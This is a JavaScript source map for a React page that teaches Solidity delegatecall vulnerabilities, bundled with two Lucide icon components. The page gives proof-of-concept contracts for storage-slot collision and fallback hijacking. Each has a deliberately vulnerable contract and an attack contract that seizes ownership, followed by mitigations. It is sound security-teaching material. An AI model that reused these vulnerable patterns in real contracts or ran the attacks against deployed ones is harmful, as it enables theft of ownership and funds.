{"version":3,"file":"static/js/729.2ea23c62.chunk.js","mappings":"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","sources":["../node_modules/lucide-react/src/icons/code-xml.ts","../node_modules/lucide-react/src/icons/file-code.ts","components/vulnerabilities/delegatecall.js"],"sourcesContent":["import createLucideIcon from '../createLucideIcon';\nimport { IconNode } from '../types';\n\nexport const __iconNode: IconNode = [\n  ['path', { d: 'm18 16 4-4-4-4', key: '1inbqp' }],\n  ['path', { d: 'm6 8-4 4 4 4', key: '15zrgr' }],\n  ['path', { d: 'm14.5 4-5 16', key: 'e7oirm' }],\n];\n\n/**\n * @component @name CodeXml\n * @description Lucide SVG icon component, renders SVG Element with children.\n *\n * @preview ![img](data:image/svg+xml;base64,PHN2ZyAgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIgogIHdpZHRoPSIyNCIKICBoZWlnaHQ9IjI0IgogIHZpZXdCb3g9IjAgMCAyNCAyNCIKICBmaWxsPSJub25lIgogIHN0cm9rZT0iIzAwMCIgc3R5bGU9ImJhY2tncm91bmQtY29sb3I6ICNmZmY7IGJvcmRlci1yYWRpdXM6IDJweCIKICBzdHJva2Utd2lkdGg9IjIiCiAgc3Ryb2tlLWxpbmVjYXA9InJvdW5kIgogIHN0cm9rZS1saW5lam9pbj0icm91bmQiCj4KICA8cGF0aCBkPSJtMTggMTYgNC00LTQtNCIgLz4KICA8cGF0aCBkPSJtNiA4LTQgNCA0IDQiIC8+CiAgPHBhdGggZD0ibTE0LjUgNC01IDE2IiAvPgo8L3N2Zz4K) - https://lucide.dev/icons/code-xml\n * @see https://lucide.dev/guide/packages/lucide-react - Documentation\n *\n * @param {Object} props - Lucide icons props and any valid SVG attribute\n * @returns {JSX.Element} JSX Element\n *\n */\nconst CodeXml = createLucideIcon('CodeXml', __iconNode);\n\nexport default CodeXml;\n","import createLucideIcon from '../createLucideIcon';\nimport { IconNode } from '../types';\n\nexport const __iconNode: IconNode = [\n  ['path', { d: 'M10 12.5 8 15l2 2.5', key: '1tg20x' }],\n  ['path', { d: 'm14 12.5 2 2.5-2 2.5', key: 'yinavb' }],\n  ['path', { d: 'M14 2v4a2 2 0 0 0 2 2h4', key: 'tnqrlb' }],\n  ['path', { d: 'M15 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7z', key: '1mlx9k' }],\n];\n\n/**\n * @component @name FileCode\n * @description Lucide SVG icon component, renders SVG Element with children.\n *\n * @preview ![img](data:image/svg+xml;base64,PHN2ZyAgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIgogIHdpZHRoPSIyNCIKICBoZWlnaHQ9IjI0IgogIHZpZXdCb3g9IjAgMCAyNCAyNCIKICBmaWxsPSJub25lIgogIHN0cm9rZT0iIzAwMCIgc3R5bGU9ImJhY2tncm91bmQtY29sb3I6ICNmZmY7IGJvcmRlci1yYWRpdXM6IDJweCIKICBzdHJva2Utd2lkdGg9IjIiCiAgc3Ryb2tlLWxpbmVjYXA9InJvdW5kIgogIHN0cm9rZS1saW5lam9pbj0icm91bmQiCj4KICA8cGF0aCBkPSJNMTAgMTIuNSA4IDE1bDIgMi41IiAvPgogIDxwYXRoIGQ9Im0xNCAxMi41IDIgMi41LTIgMi41IiAvPgogIDxwYXRoIGQ9Ik0xNCAydjRhMiAyIDAgMCAwIDIgMmg0IiAvPgogIDxwYXRoIGQ9Ik0xNSAySDZhMiAyIDAgMCAwLTIgMnYxNmEyIDIgMCAwIDAgMiAyaDEyYTIgMiAwIDAgMCAyLTJWN3oiIC8+Cjwvc3ZnPgo=) - https://lucide.dev/icons/file-code\n * @see https://lucide.dev/guide/packages/lucide-react - Documentation\n *\n * @param {Object} props - Lucide icons props and any valid SVG attribute\n * @returns {JSX.Element} JSX Element\n *\n */\nconst FileCode = createLucideIcon('FileCode', __iconNode);\n\nexport default FileCode;\n","import React from 'react';\r\nimport { Accordion, Card, ListGroup } from 'react-bootstrap';\r\nimport { \r\n  ShieldAlert, \r\n  ShieldCheck, \r\n  Code2,\r\n  BookOpen,\r\n  AlertTriangle,\r\n  Lock,\r\n  FileCode\r\n} from 'lucide-react';\r\n\r\nconst DelegateCall = () => {\r\n  return (\r\n    <div className=\"container mt-4\">\r\n      <h2 className=\"mb-4 text-danger\">\r\n        <ShieldAlert className=\"me-2\" size={28} />\r\n        DelegateCall Vulnerabilities in Solidity Smart Contracts\r\n      </h2>\r\n\r\n      {/* Storage Layout Attack */}\r\n      <Accordion defaultActiveKey=\"0\" className=\"mb-4\">\r\n        <Accordion.Item eventKey=\"0\">\r\n          <Accordion.Header>\r\n            <Code2 className=\"me-2 text-warning\" size={20} />\r\n            Storage Layout Collision Attack\r\n          </Accordion.Header>\r\n          <Accordion.Body>\r\n            <Card>\r\n              <Card.Body>\r\n                <Card.Title>Vulnerability</Card.Title>\r\n                <Card.Text>\r\n                  An attacker can exploit storage slot collisions in delegatecall to manipulate contract state and take ownership by understanding how storage layouts work between contracts.\r\n                </Card.Text>\r\n\r\n                <Card.Title>Proof of Concept</Card.Title>\r\n                <pre className=\"bg-dark text-light p-3 rounded\">\r\n                  <code>\r\n{`// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.19;\r\n\r\n// Vulnerable Contract\r\ncontract HackMe {\r\n    address public owner; // Slot 0 overwrites by attacker \r\n    address public lib;   // Slot 1\r\n\r\n    constructor(address _lib) {\r\n        owner = msg.sender; // Owner is set to the deployer\r\n        lib = _lib;\r\n    }\r\n\r\n    function setNum(uint256 _num) public {\r\n        lib.delegatecall(abi.encodeWithSignature(\"setNum(uint256)\", _num));\r\n    }\r\n}\r\n\r\n// Library Contract (Trusted but vulnerable)\r\ncontract Library {\r\n    uint256 public num; // This is stored in slot 0\r\n\r\n    function setNum(uint256 _num) public {\r\n        num = _num; // This modifies the caller's slot 0\r\n    }\r\n}\r\n\r\n// Attacker Contract\r\ncontract Attack {\r\n    HackMe public hackMe;\r\n\r\n    constructor(HackMe _hackMe) {\r\n        hackMe = _hackMe;\r\n    }\r\n\r\n    function attack() public {\r\n        // Overwrites HackMe's owner with attacker's address\r\n        hackMe.setNum(uint256(uint160(address(this))));\r\n    }\r\n}`}\r\n                  </code>\r\n                </pre>\r\n\r\n                <Card.Title>Attack Mechanism</Card.Title>\r\n                <ListGroup variant=\"flush\">\r\n                  <ListGroup.Item>\r\n                    <AlertTriangle className=\"me-2 text-warning\" size={18} />\r\n                    Storage slot 0 in both contracts collide (owner and num variables)\r\n                  </ListGroup.Item>\r\n                  <ListGroup.Item>\r\n                    <AlertTriangle className=\"me-2 text-warning\" size={18} />\r\n                    Attacker converts their address to uint256 and calls setNum()\r\n                  </ListGroup.Item>\r\n                  <ListGroup.Item>\r\n                    <AlertTriangle className=\"me-2 text-warning\" size={18} />\r\n                    The delegatecall executes in HackMe's context, overwriting owner\r\n                  </ListGroup.Item>\r\n                </ListGroup>\r\n\r\n                <Card.Title className=\"mt-3\">Mitigation</Card.Title>\r\n                <ListGroup variant=\"flush\">\r\n                  <ListGroup.Item>\r\n                    <ShieldCheck className=\"me-2 text-success\" size={18} />\r\n                    Use stateless library contracts\r\n                  </ListGroup.Item>\r\n                  <ListGroup.Item>\r\n                    <ShieldCheck className=\"me-2 text-success\" size={18} />\r\n                    Carefully align storage layouts between contracts\r\n                  </ListGroup.Item>\r\n                  <ListGroup.Item>\r\n                    <ShieldCheck className=\"me-2 text-success\" size={18} />\r\n                    Use OpenZeppelin's Proxy pattern for safe delegatecall\r\n                  </ListGroup.Item>\r\n                </ListGroup>\r\n              </Card.Body>\r\n            </Card>\r\n          </Accordion.Body>\r\n        </Accordion.Item>\r\n      </Accordion>\r\n\r\n      {/* Fallback Function Attack */}\r\n\r\n      <Accordion className=\"mb-4\">\r\n        <Accordion.Item eventKey=\"1\">\r\n          <Accordion.Header>\r\n            <FileCode className=\"me-2 text-warning\" size={20} />\r\n            Fallback Function Hijacking\r\n          </Accordion.Header>\r\n          <Accordion.Body>\r\n            <Card>\r\n              <Card.Body>\r\n                <Card.Title>Vulnerability</Card.Title>\r\n                <Card.Text>\r\n                  Attackers can exploit delegatecall in fallback functions to execute arbitrary functions and take control of the contract through storage manipulation.\r\n                </Card.Text>\r\n\r\n                <Card.Title>Proof of Concept</Card.Title>\r\n                <pre className=\"bg-dark text-light p-3 rounded\">\r\n                  <code>\r\n{`// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.19;\r\n\r\ncontract Lib {\r\n    address public owner;\r\n\r\n    function pwn() public {\r\n        owner = msg.sender;\r\n    }\r\n}\r\n\r\ncontract HackMe {\r\n    address public owner;\r\n    Lib public lib;\r\n\r\n    constructor(Lib _lib) {\r\n        owner = msg.sender;\r\n        lib = Lib(_lib);\r\n    }\r\n\r\n    fallback() external payable {\r\n        address(lib).delegatecall(msg.data);\r\n    }\r\n}\r\n\r\ncontract Attack {\r\n    address public hackMe;\r\n\r\n    constructor(address _hackMe) {\r\n        hackMe = _hackMe;\r\n    }\r\n\r\n    function attack() public {\r\n        hackMe.call(abi.encodeWithSignature(\"pwn()\"));\r\n    }\r\n}`}\r\n                  </code>\r\n                </pre>\r\n\r\n                <Card.Title>Attack Flow</Card.Title>\r\n                <ListGroup variant=\"flush\">\r\n                  <ListGroup.Item>\r\n                    <AlertTriangle className=\"me-2 text-warning\" size={18} />\r\n                    Attacker calls non-existent pwn() function\r\n                  </ListGroup.Item>\r\n                  <ListGroup.Item>\r\n                    <AlertTriangle className=\"me-2 text-warning\" size={18} />\r\n                    Fallback function forwards call to library via delegatecall\r\n                  </ListGroup.Item>\r\n                  <ListGroup.Item>\r\n                    <AlertTriangle className=\"me-2 text-warning\" size={18} />\r\n                    Library's pwn() executes in HackMe's context, changing ownership\r\n                  </ListGroup.Item>\r\n                </ListGroup>\r\n\r\n                <Card.Title className=\"mt-3\">Mitigation</Card.Title>\r\n                <ListGroup variant=\"flush\">\r\n                  <ListGroup.Item>\r\n                    <ShieldCheck className=\"me-2 text-success\" size={18} />\r\n                    Never use delegatecall in fallback functions\r\n                  </ListGroup.Item>\r\n                  <ListGroup.Item>\r\n                    <ShieldCheck className=\"me-2 text-success\" size={18} />\r\n                    Implement function selector validation\r\n                  </ListGroup.Item>\r\n                  <ListGroup.Item>\r\n                    <ShieldCheck className=\"me-2 text-success\" size={18} />\r\n                    Use explicit interface definitions for external calls\r\n                  </ListGroup.Item>\r\n                </ListGroup>\r\n\r\n                <Card.Title className=\"mt-3\">Security Best Practices</Card.Title>\r\n                <ListGroup variant=\"flush\">\r\n                  <ListGroup.Item>\r\n                    <Lock className=\"me-2 text-success\" size={18} />\r\n                    Use immutable contracts for library code\r\n                  </ListGroup.Item>\r\n                  <ListGroup.Item>\r\n                    <Lock className=\"me-2 text-success\" size={18} />\r\n                    Implement access controls on critical functions\r\n                  </ListGroup.Item>\r\n                  <ListGroup.Item>\r\n                    <Lock className=\"me-2 text-success\" size={18} />\r\n                    Audit storage layouts thoroughly when using delegatecall\r\n                  </ListGroup.Item>\r\n                </ListGroup>\r\n              </Card.Body>\r\n            </Card>\r\n          </Accordion.Body>\r\n        </Accordion.Item>\r\n\r\n\r\n   {/* DEX Implementation Analysis */}\r\n\r\n\r\n      </Accordion>\r\n    </div>\r\n  );\r\n};\r\n\r\nexport default DelegateCall;"],"names":["CodeXml","createLucideIcon","d","key","FileCode","DelegateCall","_jsxs","className","children","_jsx","ShieldAlert","size","Accordion","defaultActiveKey","Item","eventKey","Header","Code2","Body","Card","Title","Text","ListGroup","variant","AlertTriangle","ShieldCheck","Lock"],"sourceRoot":""}